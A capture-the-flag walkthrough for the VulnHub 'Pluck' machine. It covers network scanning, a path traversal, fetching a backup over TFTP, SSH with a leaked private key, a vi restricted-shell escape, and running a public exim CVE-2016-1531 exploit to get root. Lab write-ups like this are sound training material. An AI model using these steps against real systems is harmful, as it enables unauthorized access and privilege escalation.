# Pluck

## 1.Scan Network

```bash
root@kali: arp-scan -I eth1 -l

Interface: eth1, type: EN10MB, MAC: 00:0c:29:3a:bc:b3, IPv4: 192.168.127.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.127.1	00:50:56:c0:00:01	VMware, Inc.
192.168.127.133	00:0c:29:e8:d3:70	VMware, Inc.
192.168.127.254	00:50:56:eb:a0:df	VMware, Inc.
```

The IP address is `192.168.127.133`, let's enumerate it


## 2.Enumeration

```bash
root@kali: nmap -p22,80,3306,5355 -sV -sC -v -oN nmap.out 192.168.127.133

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.3p1 Ubuntu 1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e8:87:ba:3e:d7:43:23:bf:4a:6b:9d:ae:63:14:ea:71 (RSA)
|   256 8f:8c:ac:8d:e8:cc:f9:0e:89:f7:5d:a0:6c:28:56:fd (ECDSA)
|_  256 18:98:5a:5a:5c:59:e1:25:70:1c:37:1a:f2:c7:26:fe (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Pluck
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
3306/tcp open  mysql   MySQL (unauthorized)
5355/tcp open  llmnr?
MAC Address: 00:0C:29:E8:D3:70 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We first go for port 80 and check the website :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/b4b4d9d2-09c4-4692-84df-c265b67b5297)

checking different parts of the page i found `Contact Us` menu which loads the page like this :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/350d1de7-4dd5-451f-850e-115614ce36ca)

i used burp to repeat the process for a path traversal vulnerability and it worked :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/2bc65341-4166-40f8-8ab7-e66e4c2ab9f8)

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/a65ba4fd-84bf-4435-96b2-ecd4abfebae4)


after sending request to `/usr/local/scripts/backup.sh` the contents below showed up :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/0211def6-716a-4d36-9dac-77338580233e)


here it says that backups are accessible through tftp, so we can check if we can reach it :

```bash
root@kali: tftp 192.168.127.133
tftp> get /backups/backup.tar
tftp> quit
```

now we extract the backup.tar file and see there are 2 directories in it :

```bash
root@kali: tar -xvf backup.tar
```

navigate to `home` folder and see the contents :


```bash
root@kali: tree .              
.
├── bob
├── CVE-2016-1531.sh
├── paul
│   └── keys
│       ├── id_key1
│       ├── id_key1.pub
│       ├── id_key2
│       ├── id_key2.pub
│       ├── id_key3
│       ├── id_key3.pub
│       ├── id_key4
│       ├── id_key4.pub
│       ├── id_key5
│       ├── id_key5.pub
│       ├── id_key6
│       └── id_key6.pub
└── peter
```

one of the private keys should work, so i checked one by one until i found that `id_key4` works to connect to ssh :

```bash
root@kali: ssh -i id_key4 paul@192.168.127.133
```

after logging in, we do not see a normal shell but some kind of restricted panel with options :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/ea73b986-0297-46eb-acb4-863077921902)


## 3.Getting Shell

After looking at out options one intresting is `edit file` since it gives us the VI environment and we know that we can escape the VI to shell :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/2224fd5b-3205-42d3-b8f4-221f214536fd)

after that just type :

- :set shell=/bin/bash
- :shell

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/ec756748-4464-4c10-83d4-ba4d5f043558)

yes, we just escaped the restircted environment and have a normal shell

## 4.Privilege Escalation

I tried finding SUID binaries on the system and found :

```bash
paul@pluck:~$ find / -user root -perm /4000 2>/dev/null
/usr/exim/bin/exim-4.84-7
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgidmap
/usr/bin/chsh
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/s-nail/s-nail-privsep
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/bin/su
/bin/umount
/bin/mount
/bin/fusermount
/bin/ping
/bin/ntfs-3g
```

in the first line we see `exim-4.84-7` that has suid permission, so i searched for its exploit online and found [this github page](https://github.com/kam1n0/sudo-exim4-privesc/blob/master/cve-2016-1531.sh)

and uploaded it on the server :

```bash
paul@pluck:/tmp$ ./CVE-2016-1531.sh
[ CVE-2016-1531 local root exploit
# id
uid=0(root) gid=1002(paul) groups=1002(paul)

# cd /root

# cat flag.txt

Congratulations you found the flag

---------------------------------------

######   ((((((((((((((((((((((((((((((
#########   (((((((((((((((((((((((((((
,,##########   ((((((((((((((((((((((((
@@,,,##########   (((((((((((((((((((((
@@@@@,,,##########                     
@@@@@@@@,,,############################
@@@@@@@@@@@,,,#########################
@@@@@@@@@,,,###########################
@@@@@@,,,##########                    
@@@,,,##########   &&&&&&&&&&&&&&&&&&&&
,,,##########   &&&&&&&&&&&&&&&&&&&&&&&
##########   &&&&&&&&&&&&&&&&&&&&&&&&&&
#######   &&&&&&&&&&&&&&&&&&&&&&&&&&&&&

# 

```

this is how you can get root on the system :)



















